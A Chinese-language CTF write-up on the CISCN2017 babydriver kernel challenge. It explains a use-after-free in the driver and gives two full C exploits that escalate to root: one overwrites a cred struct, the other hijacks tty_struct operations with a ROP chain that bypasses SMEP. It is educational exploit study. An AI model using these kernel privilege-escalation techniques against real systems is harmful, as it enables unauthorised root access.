# kernel学习之路(二)


以CISCN2017-babydriver这道题来入门kernel pwn。

<!--more-->

# 涉及知识

+ UAF

+ cred struct

+ tty_struct

+ kernel的gdb调试

# 利用cred struct来提权

这道题有两种解法，我们先讲第一种。

程序存在一个伪条件竞争的UAF，当我们利用open('/dev/babydrive',2)打开两个设备A和B后，对A设备通过ioctl来申请空间，当A被释放后，B可以操控A申请来的空间，这是因为在驱动程序中，保存空间地址的指针，是一个全局变量，故A和B可以同时访问。

这里我们可以写一个POC来证明这个漏洞的存在。

```` c
int f1=open("/dev/babydev",O_RDWR);
int f2=open("/dev/babydev",O_RDWR);
ioctl(f1,0x10001,0x80);
char buf[8]={0x61};
fwrite(f1,buf,8);
close(f1);
char buf2[8]={0x62};
fwrite(f2,buf2,8);
````

在fwrite处下断点后，获得申请空间的地址，来查看其值。f1设备对其写入了0x61，当其关闭后，f2又将0x62写入其中，证明f2设备可以操控f1释放后的空间。

那么如果我们这个释放后的空间被另一个进程申请作为其cred_struct的存储空间，我们不就可以修改器cred为0，及root权限了吗？

那么我们的思路就很清晰了，首先申请一个sizeof(cred_struct)大小的空间，释放掉，然后fork一个新进程，再修改空间为0，提权。

这里有一个需要解决的问题就是cred_struct究竟多大？得到其大小的方法有两一个。

+ 浏览源码，计算其结构的大小
+ 编译一个带符号的内核，直接查看

获得其大小后，就很简单了，直接上EXP。

```` c
/*
Author: Nopnoping
*/
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <pthread.h>

//use for save  environment of user space when to kernel space.
size_t user_cs,user_ss,user_sp,user_rflags;
void save_status()
{
	//sava cs,ss,sp,rflags
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
}

//commit_creds is a function point to get root 
//prepare_kernel_cred is also a function point to make a cred struct
size_t commit_creds=0,prepare_kernel_cred=0;
void get_root()
{
	char*(*pkc)(int)=prepare_kernel_cred;
	void (*cc)(char *)=commit_creds;
	//zero is root permissions
	(*cc)(*pkc(0));
}

int main()
{
	int f1=open("/dev/babydev",2);
	int f2=open("/dev/babydev",2);

	ioctl(f1,0x10001,0xa8);
	close(f1);
	puts("[+] close file");
	int pid=fork();
	if(pid<0)
	{
		puts("[+] fork wrong");
		exit(0);
	}
	else if(pid==0)
	{
		char zeros[30]={0};
		write(f2,zeros,28);
		if(getuid()==0)
		{
			puts("[+] get root");
			system("/bin/sh");
			exit(0);
		}
	}
	else
	{
		wait(NULL);
	}
	close(f2);
	return 0;
}

````

# 利用tty_struct来提权

第二个方法要复杂很多，其利用了tty_stuct。

tty_struct是tty设备创建的一个结构，ptmx设备时tty设备的一种，我们一起来看一下tty_struct结构的内容。

```` c
// Linux-4.19.65-source/include/linux/tty.h

/*
 * Where all of the state associated with a tty is kept while the tty
 * is open.  Since the termios state should be kept even if the tty
 * has been closed --- for things like the baud rate, etc --- it is
 * not stored here, but rather a pointer to the real state is stored
 * here.  Possible the winsize structure should have the same
 * treatment, but (1) the default 80x24 is usually right and (2) it's
 * most often used by a windowing system, which will set the correct
 * size each time the window is created or resized anyway.
 * 						- TYT, 9/14/92
 */

struct tty_operations;

struct tty_struct {
	int	magic;
	struct kref kref;
	struct device *dev;
	struct tty_driver *driver;
	const struct tty_operations *ops;
	int index;

	/* Protects ldisc changes: Lock tty not pty */
	struct ld_semaphore ldisc_sem;
	struct tty_ldisc *ldisc;

	struct mutex atomic_write_lock;
	struct mutex legacy_mutex;
	struct mutex throttle_mutex;
	struct rw_semaphore termios_rwsem;
	struct mutex winsize_mutex;
	spinlock_t ctrl_lock;
	spinlock_t flow_lock;
	/* Termios values are protected by the termios rwsem */
	struct ktermios termios, termios_locked;
	struct termiox *termiox;	/* May be NULL for unsupported */
	char name[64];
	struct pid *pgrp;		/* Protected by ctrl lock */
	struct pid *session;
	unsigned long flags;
	int count;
	struct winsize winsize;		/* winsize_mutex */
	unsigned long stopped:1,	/* flow_lock */
		      flow_stopped:1,
		      unused:BITS_PER_LONG - 2;
	int hw_stopped;
	unsigned long ctrl_status:8,	/* ctrl_lock */
		      packet:1,
		      unused_ctrl:BITS_PER_LONG - 9;
	unsigned int receive_room;	/* Bytes free for queue */
	int flow_change;

	struct tty_struct *link;
	struct fasync_struct *fasync;
	wait_queue_head_t write_wait;
	wait_queue_head_t read_wait;
	struct work_struct hangup_work;
	void *disc_data;
	void *driver_data;
	spinlock_t files_lock;		/* protects tty_files list */
	struct list_head tty_files;

#define N_TTY_BUF_SIZE 4096

	int closing;
	unsigned char *write_buf;
	int write_cnt;
	/* If the tty has a pending do_SAK, queue it here - akpm */
	struct work_struct SAK_work;
	struct tty_port *port;
} __randomize_layout;
````

在结构体中，有一个很重要的成员，const struct tty_operations *ops。它的意义有点类似与IO_FILE的vtable，其指向的是一个函数表，当对这个设备进行一些操作时，将会调用相应的函数，这里如果我们将这个指针修改为我们可控的值，不就可以实现任意函数执行？

我们先看一下tty_operation这个结构

```` c
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct file *filp, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      const unsigned char *buf, int count);
	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	int  (*write_room)(struct tty_struct *tty);
	int  (*chars_in_buffer)(struct tty_struct *tty);
	int  (*ioctl)(struct tty_struct *tty,
		    unsigned int cmd, unsigned long arg);
	long (*compat_ioctl)(struct tty_struct *tty,
			     unsigned int cmd, unsigned long arg);
	void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
	void (*throttle)(struct tty_struct * tty);
	void (*unthrottle)(struct tty_struct * tty);
	void (*stop)(struct tty_struct *tty);
	void (*start)(struct tty_struct *tty);
	void (*hangup)(struct tty_struct *tty);
	int (*break_ctl)(struct tty_struct *tty, int state);
	void (*flush_buffer)(struct tty_struct *tty);
	void (*set_ldisc)(struct tty_struct *tty);
	void (*wait_until_sent)(struct tty_struct *tty, int timeout);
	void (*send_xchar)(struct tty_struct *tty, char ch);
	int (*tiocmget)(struct tty_struct *tty);
	int (*tiocmset)(struct tty_struct *tty,
			unsigned int set, unsigned int clear);
	int (*resize)(struct tty_struct *tty, struct winsize *ws);
	int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
	int (*get_icount)(struct tty_struct *tty,
				struct serial_icounter_struct *icount);
	void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
	int (*poll_init)(struct tty_driver *driver, int line, char *options);
	int (*poll_get_char)(struct tty_driver *driver, int line);
	void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
	int (*proc_show)(struct seq_file *, void *);
} __randomize_layout;
````

我们来验证一下刚才任意函数执行的想法。

```` c
int f1=open("/dev/babydev",O_RDWR);
int f2=open("/dev/babydev",O_RDWR);
ioctl(f1,0x10001,0x2e0);
close(f1);

int fd_tty=open("/dev/ptmx",O_RDWR|O_NOCTTY);

for(int i=0;i<0x20;i++)
    fake_tty_operations[i]=0xffffffffffff0000+i;

read(f2,fake_tty_struct,0x20);
fake_tty_struct[3]=(size_t) fake_tty_operations;
write(f2,fake_tty_struct,0x20);

fake_tty_operations[7]=0xffffffffc00000f0;
char buf[8]={0x61};
write(fd_tty,buf,8);
````

我们将tty_operation中的write修改为babywrite的地址，并再babywrite处下断点，gdb调试。

![](https://raw.githubusercontent.com/TroyeCriss/blog_img/master/img/2.png)

成功执行到了babywrite处，并且我们观察到rax的值刚好是我们伪造的tty_operetions的地址，如果将tty的write函数修改为mov rsp,rax不就可以实现栈迁移，并且构造rop链了吗？但是我们不能直接把rop链构造在伪造的tty_operations中，因为我们需要构造的rop比较长，有可能会覆盖write函数，因此我们在tty_operation中再栈迁移一次，将其迁移到我们的rop链中。

如果想要用rop来提权我们需要bypass smep保护，是否开启SMEP保护，是根据cr4的第20位来判断的，我们可以利用mov cr4,rdi等gadget来绕过这个保护。

我们的思路很清晰了。

+ 利用mov rsp，rax进行栈迁移
+ 利用mov cr4，rdi绕过SMEP
+ 利用ret2user技术提权

给出EXP

```c
/*
Author: Nopnoping
*/
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <pthread.h>

//use for save  environment of user space when to kernel space.
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov %cs,user_cs;"
            "mov %ss,user_ss;"
            "mov %rsp,user_sp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

//commit_creds is a function point to get root 
//prepare_kernel_cred is also a function point to make a cred struct
size_t commit_creds=0xffffffff810a1420,prepare_kernel_cred=0xffffffff810a1810;
void get_root()
{
	char*(*pkc)(int)=prepare_kernel_cred;
	void (*cc)(char *)=commit_creds;
	//zero is root permissions
	(*cc)((*pkc)(0));
}
void get_shell()
{
	system("/bin/sh");
	wait(NULL);
}
size_t fake_tty_struct[4]={0};
size_t fake_tty_operations[0x20]={0};
int main()
{
	save_status();

	int f1=open("/dev/babydev",O_RDWR);
	int f2=open("/dev/babydev",O_RDWR);
	//malloc size of tty_struct
	ioctl(f1,0x10001,0x2e0);
	close(f1);
	puts("[+] close file done!have fun");
	//edit operation
	puts("[+] editing operation!");
	for(int i=0;i<0x20;i++)
		fake_tty_operations[i]=0xffffffffffff0000+i ;
	//malloc tty_struct
	int fd_tty=open("/dev/ptmx",O_RDWR|O_NOCTTY);
	puts("[+] malloc tty_struct done!");
	//read data from tty_struct
	read(f2,fake_tty_struct,0x20);
	fake_tty_struct[3]=(size_t) fake_tty_operations;
	write(f2,fake_tty_struct,0x20);
	puts("[+] Modify tty operation done!");
	//make rop
	puts("[+] making rop chaine.....");
	size_t rop[]={
		0xffffffff810d238d, //pop rcx;ret;
		0x6f0,
		0xffffffff81004d80, //mov rc4,rdi;pop rbp;ret;
		(size_t)rop,
		(size_t)get_root,
		0xffffffff81063694, //swapgs;pop rbp;ret
		0,
		0xffffffff814e35ef, //iretq
		(size_t)get_shell,
		user_cs,
		user_rflags,
		user_sp,
		user_ss
	};
	puts("[+] pivok stack to rop.....");
	fake_tty_operations[7]=0xffffffff8181bfc5; //mov rsp,rax;dec ebx;ret;
	fake_tty_operations[0]=0xffffffff810635f5; //pop rax;ret;
	fake_tty_operations[1]=(size_t)rop;
	fake_tty_operations[3]=0xffffffff8181bfc5;
	puts("[+] triger...");
	char buf[8]={0x61};
	write(fd_tty,buf,8);
	return 0;
}
```

编译：

gcc -Os ./tmp/tty_struct.c -static -lutil -o exp

运行结果：

![](https://raw.githubusercontent.com/TroyeCriss/blog_img/master/img/image-20200506225023192.png)

# 参考

[一道简单内核题入门内核利用](https://www.anquanke.com/post/id/86490)

[linux kernel pwn学习之伪造tty_struct执行任意函数](https://blog.csdn.net/seaaseesa/article/details/104577501)

[Linux内核漏洞利用 Bypass SMEP](https://www.sunxiaokong.xyz/2020-02-14/lzx-bypass-babysmep/)


